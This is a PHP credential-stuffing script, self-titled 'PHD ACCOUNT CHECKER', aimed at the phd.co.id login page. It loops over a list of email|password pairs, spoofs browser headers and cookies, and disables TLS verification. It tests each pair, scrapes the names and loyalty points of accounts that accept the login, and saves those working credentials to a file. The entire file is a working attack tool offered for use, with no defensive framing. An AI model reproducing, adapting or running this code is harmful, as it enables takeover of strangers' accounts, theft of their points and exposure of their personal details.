<?php
/*
PHD ACCOUNT CHECKER 
CREATED BY ALIF DZIKRI (JEINEL CANNINE )
USAGE php phd.php y0ur_fcking_list.txt
*/
error_reporting(0);
//class color
class Colors {
		private $foreground_colors = array();
		private $background_colors = array();
		public function __construct() {
			$this->foreground_colors['black'] = '0;30';
			$this->foreground_colors['dark_gray'] = '1;30';
			$this->foreground_colors['blue'] = '0;34';
			$this->foreground_colors['light_blue'] = '1;34';
			$this->foreground_colors['green'] = '0;32';
			$this->foreground_colors['light_green'] = '1;32';
			$this->foreground_colors['cyan'] = '0;36';
			$this->foreground_colors['light_cyan'] = '1;36';
			$this->foreground_colors['red'] = '0;31';
			$this->foreground_colors['light_red'] = '1;31';
			$this->foreground_colors['purple'] = '0;35';
			$this->foreground_colors['light_purple'] = '1;35';
			$this->foreground_colors['brown'] = '0;33';
			$this->foreground_colors['yellow'] = '1;33';
			$this->foreground_colors['light_gray'] = '0;37';
			$this->foreground_colors['white'] = '1;37';
			$this->background_colors['black'] = '40';
			$this->background_colors['red'] = '41';
			$this->background_colors['green'] = '42';
			$this->background_colors['yellow'] = '43';
			$this->background_colors['blue'] = '44';
			$this->background_colors['magenta'] = '45';
			$this->background_colors['cyan'] = '46';
			$this->background_colors['light_gray'] = '47';
		}
		public function getColoredString($string, $foreground_color = null, $background_color = null) {
			$colored_string = "";
			if (isset($this->foreground_colors[$foreground_color])) {
				$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
			}
			if (isset($this->background_colors[$background_color])) {
				$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
			}
			$colored_string .=  $string . "\033[0m";
			return $colored_string;
		}
		public function getForegroundColors() {
			return array_keys($this->foreground_colors);
		}
		public function getBackgroundColors() {
			return array_keys($this->background_colors);
		}
	}

function get_cookie(){
$header[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36';
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: uuid=21f'.rand(1000,9999).'3-553d-4bc2-9859-494ade43fe87; __utma=1289'.rand(1001,9999).'5.1779109801.1575438119.1577105213.1577202265.4; __utmz=128990925.1575438119.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.3.177'.rand(1010,9999).'01.1575438119; _fbp=fb.2.1575438119687.322220362';
	$c = curl_init("https://www.phd.co.id/en/users/login/1");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
function cek($token,$cookie,$em){
$header = array();
$header[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36';
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: uuid=21f6'.rand(1000,9999).'-553d-4bc2-9859-494ade43fe87; __utma=1289'.rand(1100,9999).'.1779109801.1575438119.1577202265.1577935248.5; __utmz=128990925.1575438119.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.3.1779109801.1575438119; _fbp=fb.2.1575438119687.322220362; '.$cookie[1][1].'; _gid=GA1.3.4131'.rand(1200,9999).'6.1577935248; __utmb=128990925.5.10.1577935248; __utmc=128990925; firstBannerID=1; __utmt_https%3A%2F%2Fwww.phd.co.id%2Fen%2Fusers%2Flogin%2F1=1; _gat=1; _gat_clientTracker=1';
	$c = curl_init("https://www.phd.co.id/en/users/login/1");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_POSTFIELDS, 'return_url=https://www.phd.co.id/en/users/welcome&my_token='.$token[1].'&username='.$em[0].'&password='.$em[1].'');
	curl_setopt($c, CURLOPT_POST, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
function cek_point($cookie){
$header[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36';
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: uuid=21f6'.rand(1000,9999).'-553d-4bc2-9859-494ade43fe87; __utma=1289'.rand(1100,9999).'.1779109801.1575438119.1577202265.1577935248.5; __utmz=128990925.1575438119.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.3.1779109801.1575438119; _fbp=fb.2.1575438119687.322220362; '.$cookie[1][1].'; _gid=GA1.3.4131'.rand(1200,9999).'6.1577935248; __utmb=128990925.5.10.1577935248; __utmc=128990925; firstBannerID=1; __utmt_https%3A%2F%2Fwww.phd.co.id%2Fen%2Fusers%2Flogin%2F1=1; _gat=1; _gat_clientTracker=1';
	$c = curl_init("https://www.phd.co.id/en/accounts");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}

$colors = new Colors();
$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "Total : $count Empas \n";
while($i < $count) {
$em = explode("|", $code[$i]);
$email = $em[0];
$pass = $em[1];
$get_cookie = get_cookie();
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $get_cookie, $cookie);
preg_match('/<input type="hidden" name="my_token" value="(.*?)"\/>/', $get_cookie, $token);
$cek = cek($token,$cookie,$em);
if(preg_match('/https:\/\/www.phd.co.id\/en\/users\/login\/1/i', $cek)){
	echo $colors->getColoredString("[ $i ] DIE | ".$code[$i]." | ACC : PHD ", "black", "red"). "\n";
} else{
	$cek_point = cek_point($cookie);
	preg_match('/<li class="owner-poin">(.*?)<\/li>/', $cek_point, $point);
	preg_match('/<li class="owner-name mobile-only">(.*?) <span class="small-text"><a href="https:\/\/www.phd.co.id\/en\/accounts\/edit">edit<\/a><\/span><\/li>/', $cek_point, $nama);
	preg_match('/<li class="owner-telephone">(.*?)<\/li>/', $cek_point, $nomor);
	echo $colors->getColoredString("[ $i ] LIVE | ".$email." | ".$pass." [ ".$nama[1]." ] [".$point[1]."] ACC : PHD ", "white", "green"). "\n";
	fwrite(fopen("phd-live.txt", "a"), "LIVE | ".$email." | ".$pass." [ ".$nama[1]." ] [".$point[1]."] ACC : PHD \n");

}$i++;
}
echo "TASK DONE, Total: $count, EMPAS LIVE Saved In phd-live.txt \n";
